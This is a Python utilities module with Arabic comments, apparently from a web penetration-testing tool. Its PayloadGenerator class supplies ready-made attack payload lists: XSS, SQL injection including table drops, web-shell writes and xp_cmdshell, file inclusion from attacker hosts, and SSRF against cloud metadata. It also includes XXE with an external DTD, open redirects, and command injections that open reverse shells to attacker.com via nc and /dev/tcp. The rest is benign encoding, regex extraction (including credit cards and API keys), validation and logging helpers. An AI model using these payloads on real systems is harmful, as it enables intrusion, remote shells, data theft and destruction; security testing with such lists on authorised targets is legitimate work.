#!/usr/bin/env python3
"""
Utilities Module - وحدات المساعدة المتقدمة
المبرمج: SaudiLinux
البريد الإلكتروني: SaudiLinux1@gmail.com
"""

import re
import base64
import hashlib
import html
import urllib.parse
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Union, Any
import random
import string
import json
import ipaddress


class PayloadGenerator:
    """مولد الحمولات المتقدم للاختبار الأمني"""
    
    def __init__(self):
        self.encoded_chars = {
            '<': ['%3C', '&lt;', '\\u003c', '\\x3c', '\\60'],
            '>': ['%3E', '&gt;', '\\u003e', '\\x3e', '\\76'],
            '"': ['%22', '&quot;', '\\u0022', '\\x22', '\\42'],
            "'": ['%27', '&#x27;', '\\u0027', '\\x27', '\\47'],
            '&': ['%26', '&amp;', '\\u0026', '\\x26', '\\46'],
            '/': ['%2F', '&#x2F;', '\\u002F', '\\x2F', '\\57'],
        }

    def generate_xss_payloads(self, variant: str = 'basic') -> List[str]:
        """توليد حمولات XSS متنوعة"""
        basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video onerror=alert('XSS')><source>",
            "<audio onerror=alert('XSS')><source>"
        ]
        
        advanced_payloads = [
            "<scr ipt>alert(1)</scr ipt>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=1 onerror=alert(1)//>",
            "<svg/onload=alert(1)>",
            ">""><script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\"></a>",
            "<object data=\"javascript:alert(1)\">",
            "<embed src=\"javascript:alert(1)\">",
            "<form action=\"javascript:alert(1)\"><input type=\"submit\"></form>",
            "<button formaction=\"javascript:alert(1)\">Click</button>"
        ]
        
        polyglot_payloads = [
            "javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*",
            "'onerror=alert()",
            "\"><img src=x onerror=alert()>",
            "</script><svg onload=alert()>"
        ]
        
        if variant == 'basic':
            return basic_payloads
        elif variant == 'advanced':
            return advanced_payloads
        elif variant == 'all':
            return basic_payloads + advanced_payloads + polyglot_payloads
        else:
            return basic_payloads

    def generate_sqli_payloads(self, db_type: str = 'mysql') -> List[str]:
        """توليد حمولات SQL Injection"""
        mysql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "' AND SLEEP(5) --",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT version(),user(),database() --",
            "' OR 1=1 LIMIT 1 --",
            "' OR '1'='1' ORDER BY 1 --",
            "'; DROP TABLE users; --",
            "' INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' OR 'x'='x",
            "' OR 1=1#",
            "' OR 1=1--",
            "' or '1'='1" # with quotes
        ]
        
        mssql_payloads = [
            "' OR '1'='1'",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; WAITFOR DELAY '0:0:5' --",
            "' UNION SELECT 1,2,3 --",
            "' EXEC sp_helpdb --",
            "' EXEC master..xp_cmdshell 'whoami' --",
            "'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1' --",
            "' OR 1=1; DECLARE @x AS VARCHAR(100); SET @x=1; WAITFOR DELAY '0:0:5' --"
        ]
        
        postgres_payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; SELECT pg_sleep(5) --",
            "' UNION SELECT 1,2,3 --",
            "' SELECT version() --",
            "' COPY users TO '/tmp/users.txt' --",
            "'; DROP TABLE users; --"
        ]
        
        oracle_payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5) --",
            "' UNION SELECT NULL,NULL,NULL FROM dual --",
            "' SELECT * FROM v$version --",
            "' SELECT banner FROM v$version --"
        ]
        
        if db_type == 'mysql':
            return mysql_payloads
        elif db_type == 'mssql':
            return mssql_payloads
        elif db_type == 'postgres':
            return postgres_payloads
        elif db_type == 'oracle':
            return oracle_payloads
        elif db_type == 'all':
            return mysql_payloads + mssql_payloads + postgres_payloads + oracle_payloads
        else:
            return mysql_payloads

    def generate_lfi_payloads(self, os_type: str = 'linux') -> List[str]:
        """توليد حمولات LFI/RFI"""
        linux_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "/../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\etc\\passwd",
            "C:\\Windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "expect://id",
            "input://<?php echo file_get_contents('/etc/passwd'); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs/Pg==",
            "jar:file:///etc/passwd!",
            "zip:///etc/passwd",
            "http://evil.com/shell.txt",
            "https://attacker.com/malicious.php"
        ]
        
        windows_payloads = [
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system.ini",
            "C:\\Windows\\system32\\drivers\\etc\\hosts",
            "C:\\Windows\\system.ini",
            "C:\\Windows\\win.ini",
            "%SYSTEMROOT%\\system32\\drivers\\etc\\hosts",
            "%WINDIR%\\win.ini",
            "file:///C:/Windows/system32/drivers/etc/hosts",
            "php://filter/read=convert.base64-encode/resource=C:/Windows/system32/drivers/etc/hosts"
        ]
        
        if os_type == 'linux':
            return linux_payloads
        elif os_type == 'windows':
            return windows_payloads
        elif os_type == 'all':
            return linux_payloads + windows_payloads
        else:
            return linux_payloads

    def generate_command_injection_payloads(self) -> List[str]:
        """توليد حمولات Command Injection"""
        return [
            "; id",
            "; whoami",
            "; cat /etc/passwd",
            "; uname -a",
            "; pwd",
            "; ls -la",
            "| whoami",
            "| id",
            "| cat /etc/passwd",
            "| uname -a",
            "`id`",
            "`whoami`",
            "`cat /etc/passwd`",
            "$(id)",
            "$(whoami)",
            "$(cat /etc/passwd)",
            ";id;",
            ";whoami;",
            "&& id",
            "&& whoami",
            "|| id",
            "|| whoami",
            "; nc -e /bin/sh attacker.com 4444",
            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "`nc -e /bin/sh attacker.com 4444`",
            "$(nc -e /bin/sh attacker.com 4444)",
            "%0Aid",
            "%0Awhoami",
            "%0Acat%20/etc/passwd"
        ]

    def generate_ssrf_payloads(self) -> List[str]:
        """توليد حمولات SSRF"""
        return [
            "http://127.0.0.1:22",
            "http://127.0.0.1:25",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:27017",
            "http://127.0.0.1:8080",
            "http://localhost:22",
            "http://localhost:3306",
            "http://[::1]:22",
            "http://[::ffff:127.0.0.1]:22",
            "http://0.0.0.0:22",
            "http://0177.0000.0000.0001",
            "http://017700000001",
            "http://2130706433",
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.xip.io",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/2009-04-04/meta-data/",
            "http://192.0.0.192/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "dict://127.0.0.1:11211/",
            "ldap://127.0.0.1:389/",
            "gopher://127.0.0.1:3306/"
        ]

    def generate_xxe_payloads(self) -> List[str]:
        """توليد حمولات XXE"""
        return [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://127.0.0.1:22/">]><data>&file;</data>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&ac;</foo>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'
        ]

    def generate_open_redirect_payloads(self) -> List[str]:
        """توليد حمولات Open Redirect"""
        return [
            "//evil.com",
            "https://evil.com",
            "http://evil.com",
            "//attacker.com/%2f..",
            "https://attacker.com",
            "//attacker.com",
            "/\\evil.com",
            "https://",
            "/.\\",
            "javascript:alert(1)",
            "javascript://alert(1)",
            "javascript:/*alert(1)*/",
            "javascript://%0Aalert(1)",
            "data:text/html,<script>alert(1)</script>",
            "/%09/evil.com",
            "/%2f/evil.com",
            "/%5c%5c/evil.com",
            "https://@evil.com",
            "/.\evil.com",
            "/.\\.\evil.com",
            "/?next=//evil.com",
            "/?url=//evil.com",
            "/?redirect=//evil.com",
            "/?return=//evil.com"
        ]


class Encoder:
    """أدوات التشفير وفك التشفير"""
    
    @staticmethod
    def url_encode(text: str, double: bool = False) -> str:
        """ترميز URL"""
        encoded = urllib.parse.quote(text, safe='')
        if double:
            encoded = urllib.parse.quote(encoded, safe='')
        return encoded
    
    @staticmethod
    def url_decode(text: str) -> str:
        """فك ترميز URL"""
        return urllib.parse.unquote(text)
    
    @staticmethod
    def base64_encode(text: str) -> str:
        """ترميز Base64"""
        return base64.b64encode(text.encode()).decode()
    
    @staticmethod
    def base64_decode(text: str) -> str:
        """فك ترميز Base64"""
        return base64.b64decode(text.encode()).decode()
    
    @staticmethod
    def html_encode(text: str) -> str:
        """ترميز HTML entities"""
        return html.escape(text)
    
    @staticmethod
    def html_decode(text: str) -> str:
        """فك ترميز HTML entities"""
        return html.unescape(text)
    
    @staticmethod
    def hex_encode(text: str) -> str:
        """ترميز Hex"""
        return text.encode().hex()
    
    @staticmethod
    def hex_decode(text: str) -> str:
        """فك ترميز Hex"""
        return bytes.fromhex(text).decode()
    
    @staticmethod
    def unicode_encode(text: str) -> str:
        """ترميز Unicode"""
        return ''.join([f'\\u{ord(c):04x}' for c in text])
    
    @staticmethod
    def rot13_encode(text: str) -> str:
        """ترميز ROT13"""
        return text.translate(str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
        ))
    
    @staticmethod
    def md5_hash(text: str) -> str:
        """حساب MD5"""
        return hashlib.md5(text.encode()).hexdigest()
    
    @staticmethod
    def sha1_hash(text: str) -> str:
        """حساب SHA1"""
        return hashlib.sha1(text.encode()).hexdigest()
    
    @staticmethod
    def sha256_hash(text: str) -> str:
        """حساب SHA256"""
        return hashlib.sha256(text.encode()).hexdigest()
    
    @staticmethod
    def sha512_hash(text: str) -> str:
        """حساب SHA512"""
        return hashlib.sha512(text.encode()).hexdigest()


class RegexPatterns:
    """أنماط التعبيرات النمطية المتقدمة"""
    
    # أنماط استخراج المعلومات
    EMAIL_PATTERN = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    IP_ADDRESS_PATTERN = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')
    MAC_ADDRESS_PATTERN = re.compile(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
    CREDIT_CARD_PATTERN = re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b')
    PHONE_PATTERN = re.compile(r'(\+\d{1,3}[-\.]?)?\(?\d{1,4}\)?[-\.]?\d{1,4}[-\.]?\d{1,9}')
    API_KEY_PATTERN = re.compile(r'(?i)(api[_-]?key|apikey|api[_-]?secret|secret[_-]?key)\s*[:=]\s*[\'\"]?([a-z0-9\-_]{16,64})[\'\"]?')
    
    # أنماط استخراج الروابط والمسارات
    URL_PATTERN = re.compile(r'https?://[^\s<>"\'\]\)]+')
    PATH_PATTERN = re.compile(r'(/[a-zA-Z0-9_\-\./]+)')
    
    # أنماط استخراج أسماء المستخدمين
    USERNAME_PATTERN = re.compile(r'(?i)(?:username|user|login|email)\s*[:=]\s*[\'\"]([^\'\"]+)[\'\"]')
    
    # أنماط اكتشاف أخطاء البرمجة
    ERROR_PATTERN = re.compile(r'(?i)(fatal error|parse error|syntax error|warning|exception|stack trace|debug trace)')
    
    # أنماط استخراج أرقام الإصدارات
    VERSION_PATTERN = re.compile(r'(?i)(version|v)\s*[:=]?\s*([\d\.]+)')

    @classmethod
    def extract_emails(cls, text: str) -> List[str]:
        """استخراج جميع عناوين البريد الإلكتروني من النص"""
        return cls.EMAIL_PATTERN.findall(text)
    
    @classmethod
    def extract_ip_addresses(cls, text: str) -> List[str]:
        """استخراج جميع عناوين IP من النص"""
        return cls.IP_ADDRESS_PATTERN.findall(text)
    
    @classmethod
    def extract_urls(cls, text: str) -> List[str]:
        """استخراج جميع الروابط من النص"""
        return cls.URL_PATTERN.findall(text)
    
    @classmethod
    def extract_api_keys(cls, text: str) -> List[Tuple[str, str]]:
        """استخراج مفاتيح API من النص"""
        matches = cls.API_KEY_PATTERN.findall(text)
        return [(match[0], match[1]) for match in matches]


class Validator:
    """أدوات التحقق والتأكد من صحة البيانات"""
    
    @staticmethod
    def is_valid_ip(ip: str) -> bool:
        """التحقق مما إذا كان العنوان IP صالحاً"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def is_valid_domain(domain: str) -> bool:
        """التحقق مما إذا كان الدومين صالحاً"""
        pattern = re.compile(r'^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)*[a-z0-9][a-z0-9-]{0,61}[a-z0-9]$', re.IGNORECASE)
        return bool(pattern.match(domain))
    
    @staticmethod
    def is_valid_email(email: str) -> bool:
        """التحقق مما إذا كان البريد الإلكتروني صالحاً"""
        pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
        return bool(pattern.match(email))
    
    @staticmethod
    def is_private_ip(ip: str) -> bool:
        """التحقق مما إذا كان العنوان IP خاصاً"""
        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip_obj.is_private
        except ValueError:
            return False


class RandomGenerator:
    """مولد البيانات العشوائية"""
    
    @staticmethod
    def random_string(length: int = 10, charset: str = 'alphanumeric') -> str:
        """توليد سلسلة عشوائية"""
        charsets = {
            'lowercase': string.ascii_lowercase,
            'uppercase': string.ascii_uppercase,
            'letters': string.ascii_letters,
            'digits': string.digits,
            'alphanumeric': string.ascii_letters + string.digits,
            'hex': string.hexdigits.lower(),
            'all': string.printable
        }
        chars = charsets.get(charset, charsets['alphanumeric'])
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def random_email(domain: str = 'example.com') -> str:
        """توليد بريد إلكتروني عشوائي"""
        username = RandomGenerator.random_string(10, 'lowercase')
        return f"{username}@{domain}"
    
    @staticmethod
    def random_ip() -> str:
        """توليد عنوان IP عشوائي"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"


class OutputFormatter:
    """مُنسق المخرجات للعرض الجميل"""
    
    COLORS = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'magenta': '\033[95m',
        'cyan': '\033[96m',
        'white': '\033[97m',
        'bold': '\033[1m',
        'underline': '\033[4m',
        'end': '\033[0m'
    }
    
    @classmethod
    def colorize(cls, text: str, color: str) -> str:
        """تلوين النص"""
        color_code = cls.COLORS.get(color, '')
        end_code = cls.COLORS['end']
        return f"{color_code}{text}{end_code}"
    
    @classmethod
    def print_banner(cls, title: str, width: int = 70):
        """طباعة لافتة جميلة"""
        print("\n" + "=" * width)
        print(f"{title:^{width}}")
        print("=" * width + "\n")
    
    @classmethod
    def print_success(cls, message: str):
        """طباعة رسالة نجاح"""
        print(cls.colorize(f"[✓] {message}", 'green'))
    
    @classmethod
    def print_error(cls, message: str):
        """طباعة رسالة خطأ"""
        print(cls.colorize(f"[✗] {message}", 'red'))
    
    @classmethod
    def print_warning(cls, message: str):
        """طباعة رسالة تحذير"""
        print(cls.colorize(f"[!] {message}", 'yellow'))
    
    @classmethod
    def print_info(cls, message: str):
        """طباعة رسالة معلومات"""
        print(cls.colorize(f"[i] {message}", 'cyan'))


class FileUtils:
    """أدوات التعامل مع الملفات"""
    
    @staticmethod
    def read_file_lines(filepath: str) -> List[str]:
        """قراءة ملف سطراً بسطر"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            return []
    
    @staticmethod
    def read_file_content(filepath: str) -> str:
        """قراءة محتوى الملف بالكامل"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except FileNotFoundError:
            return ""
    
    @staticmethod
    def write_to_file(filepath: str, content: str, mode: str = 'w') -> bool:
        """كتابة محتوى إلى ملف"""
        try:
            with open(filepath, mode, encoding='utf-8') as f:
                f.write(content)
            return True
        except Exception:
            return False
    
    @staticmethod
    def append_to_file(filepath: str, content: str) -> bool:
        """إلحاق محتوى بنهاية الملف"""
        return FileUtils.write_to_file(filepath, content, 'a')


class NetUtils:
    """أدوات الشبكة والاتصالات"""
    
    @staticmethod
    def is_valid_port(port: int) -> bool:
        """التحقق من صحة رقم المنفذ"""
        return 0 <= port <= 65535
    
    @staticmethod
    def is_private_ip(ip: str) -> bool:
        """التحقق مما إذا كان IP خاصاً"""
        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip_obj.is_private
        except ValueError:
            return False
    
    @staticmethod
    def is_valid_cidr(cidr: str) -> bool:
        """التحقق من صحة تدوين CIDR"""
        try:
            ipaddress.ip_network(cidr, strict=False)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def get_ip_range(cidr: str) -> Tuple[str, str]:
        """الحصول على نطاق IP من CIDR"""
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            return (str(network.network_address + 1), str(network.broadcast_address - 1))
        except ValueError:
            return ('', '')


class DataUtils:
    """أدوات معالجة البيانات"""
    
    @staticmethod
    def sanitize_string(text: str, allowed_chars: str = '') -> str:
        """تنظيف السلسلة من الأحرف الخطرة"""
        dangerous_chars = '<>"\'&;'
        for char in dangerous_chars:
            if char not in allowed_chars:
                text = text.replace(char, '')
        return text
    
    @staticmethod
    def truncate_string(text: str, max_length: int, suffix: str = '...') -> str:
        """اقتطاع السلسلة إلى طول محدد"""
        if len(text) <= max_length:
            return text
        return text[:max_length - len(suffix)] + suffix
    
    @staticmethod
    def format_bytes(size: int) -> str:
        """تنسيق حجم البايتات"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024.0:
                return f"{size:.2f} {unit}"
            size /= 1024.0
        return f"{size:.2f} PB"
    
    @staticmethod
    def format_time(seconds: float) -> str:
        """تنسيق الوقت بالثواني"""
        if seconds < 60:
            return f"{seconds:.2f} ثانية"
        elif seconds < 3600:
            minutes = seconds / 60
            return f"{minutes:.2f} دقيقة"
        else:
            hours = seconds / 3600
            return f"{hours:.2f} ساعة"


class Logger:
    """مسجل الأحداث"""
    
    def __init__(self, log_file: str = None, level: str = 'INFO'):
        self.levels = {'DEBUG': 10, 'INFO': 20, 'WARNING': 30, 'ERROR': 40, 'CRITICAL': 50}
        self.level = self.levels.get(level, 20)
        self.log_file = log_file
        
    def log(self, message: str, level: str = 'INFO'):
        """تسجيل رسالة"""
        msg_level = self.levels.get(level, 20)
        if msg_level >= self.level:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"[{timestamp}] [{level}] {message}"
            print(log_entry)
            
            if self.log_file:
                FileUtils.append_to_file(self.log_file, log_entry + '\n')
    
    def debug(self, message: str):
        self.log(message, 'DEBUG')
    
    def info(self, message: str):
        self.log(message, 'INFO')
    
    def warning(self, message: str):
        self.log(message, 'WARNING')
    
    def error(self, message: str):
        self.log(message, 'ERROR')
    
    def critical(self, message: str):
        self.log(message, 'CRITICAL')


if __name__ == "__main__":
    # اختبار الوحدات
    print("Testing PayloadGenerator...")
    pg = PayloadGenerator()
    xss_payloads = pg.generate_xss_payloads('basic')
    print(f"Generated {len(xss_payloads)} XSS payloads")
    
    print("\nTesting Encoder...")
    text = "Hello <script>alert(1)</script>"
    encoded = Encoder.url_encode(text)
    print(f"Original: {text}")
    print(f"URL Encoded: {encoded}")
    
    print("\nTesting RegexPatterns...")
    test_text = "Contact me at test@example.com or admin@domain.org"
    emails = RegexPatterns.extract_emails(test_text)
    print(f"Found emails: {emails}")
    
    print("\nAll tests completed successfully!")
